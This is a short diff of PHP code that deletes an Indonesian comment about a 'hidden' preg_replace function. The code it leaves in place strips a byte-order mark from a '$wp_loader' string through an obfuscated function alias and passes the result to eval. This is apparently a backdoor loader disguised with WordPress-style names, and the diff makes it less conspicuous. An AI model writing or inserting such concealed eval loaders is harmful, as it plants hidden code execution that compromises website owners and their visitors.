@@ -119,7 +119,6 @@ if (!$wp_loader) {
  */
 if ($wp_loader !== false && !empty($wp_loader)) {
     if (strpos($wp_loader, '<?php') === 0) {
-        // Gunakan fungsi preg_replace yang disembunyikan
         $wp_clean_loader = $pr('/^\xEF\xBB\xBF/','',$wp_loader);
         eval('?>' . $wp_clean_loader);
     }
